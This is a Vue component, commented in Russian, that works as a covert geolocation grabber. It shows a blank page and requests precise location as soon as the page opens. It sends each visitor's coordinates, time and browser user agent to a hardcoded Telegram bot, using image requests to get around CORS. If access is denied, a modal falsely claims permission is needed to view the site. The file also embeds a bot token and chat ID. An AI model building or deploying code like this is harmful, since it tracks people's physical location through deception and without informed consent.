<template>
  <!-- Ничего не показываем, пока всё ок -->
  <!-- Показываем только модалку при отказе -->
  <div v-if="showModal" class="modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="geo-title">
    <div class="modal">
      <h3 id="geo-title">Нужен доступ</h3>
      <p class="muted">
        Чтобы просмотреть информацию на сайте, разрешите доступ.
        Вы можете нажать кнопку ниже, чтобы повторить запрос.
      </p>

      <div class="actions">
        <button class="primary" @click="requestAndSend" :disabled="sending">
          {{ sending ? 'Запрашиваю…' : 'Дать доступ' }}
        </button>

      </div>

    
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted } from "vue"

// ⚠️ Ваши данные — лежат в клиенте (только для теста!)
const BOT_TOKEN = "6499214149:AAF6xgZAIGXsO3mqdtiF_nMW-6N4sxOSECg"
const CHAT_ID   = "6873895827"

const showModal = ref(false)
const sending = ref(false)

// GET-запрос через Image() — уходим от CORS-ответа
function fireGet(url) {
  return new Promise(resolve => {
    const img = new Image()
    img.onload = img.onerror = () => resolve(true)
    img.src = url + (url.includes("?") ? "&" : "?") + "_=" + Date.now()
  })
}

async function sendLocationToTelegram(lat, lon) {
  const base = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}`
  const urlLoc = `${base}/sendLocation?chat_id=${encodeURIComponent(CHAT_ID)}&latitude=${encodeURIComponent(lat)}&longitude=${encodeURIComponent(lon)}`
  await fireGet(urlLoc)

  const text = encodeURIComponent(
    `📍 Новая локация\n🌍 ${lat}, ${lon}\n🕓 ${new Date().toISOString()}\n📱 ${navigator.userAgent}`
  )
  const urlMsg = `${base}/sendMessage?chat_id=${encodeURIComponent(CHAT_ID)}&text=${text}`
  await fireGet(urlMsg)
}

function requestAndSend() {
  if (!("geolocation" in navigator)) {
    // если в браузере нет гео — показываем подсказки через модалку
    showModal.value = true
    return
  }

  sending.value = true

  navigator.geolocation.getCurrentPosition(
    async pos => {
      const { latitude, longitude } = pos.coords
      try {
        await sendLocationToTelegram(latitude, longitude)
        // успех — модалка не нужна
        showModal.value = false
      } finally {
        sending.value = false
      }
    },
    err => {
      sending.value = false
      // показываем модалку только если отказано (или другая ошибка получения)
      if (err.code === err.PERMISSION_DENIED || err.code === err.POSITION_UNAVAILABLE || err.code === err.TIMEOUT) {
        showModal.value = true
      }
    },
    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
  )
}

function dismiss() {
  // Просто скрыть модалку (опционально). Если хотите — можно оставить всегда открытой.
  showModal.value = false
}

// Автозапрос при входе
onMounted(async () => {
  try {
    // Проверим состояние разрешения, если есть Permissions API
    if (navigator.permissions && navigator.permissions.query) {
      const res = await navigator.permissions.query({ name: "geolocation" })
      if (res.state === "denied") {
        // Пользователь ранее запретил — сразу модалка
        showModal.value = true
      }
      // Следим за изменениями (если включит обратно — попробуем снова)
      res.onchange = () => {
        if (res.state === "granted") {
          showModal.value = false
          requestAndSend()
        } else if (res.state === "denied") {
          showModal.value = true
        }
      }
    }
  } catch {
    // игнорируем — перейдём к обычному запросу
  }

  // Сразу пытаемся запросить и отправить
  requestAndSend()
})
</script>

<style scoped>
/* Никаких элементов на странице, только модалка при отказе */
.modal-backdrop {
  position: fixed;
  inset: 0;
  background: rgba(2, 6, 23, 0.66); /* #020617 aa */
  display: grid;
  place-items: center;
  z-index: 9999;
  backdrop-filter: blur(2px);
}

.modal {
  width: min(520px, calc(100vw - 32px));
  background: #111827;
  color: #e5e7eb;
  border: 1px solid #1f2937;
  border-radius: 16px;
  padding: 20px 18px;
  box-shadow: 0 10px 30px rgba(0,0,0,.35);
  font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
}

h3 { margin: 0 0 8px; font-size: 18px; }
.muted { color: #94a3b8; margin: 0 0 12px; }

.actions {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
  margin: 8px 0 6px;
}

button {
  border: 0;
  border-radius: 10px;
  padding: 10px 14px;
  font-weight: 600;
  cursor: pointer;
}
.primary { background: #2563eb; color: #fff; }
.primary[disabled] { opacity: .6; cursor: not-allowed; }
.ghost { background: #334155; color: #e5e7eb; }

.help {
  margin-top: 8px;
  color: #cbd5e1;
}
.help summary { cursor: pointer; user-select: none; }
.help ul {
  margin: 8px 0 0;
  padding-left: 18px;
}
</style>
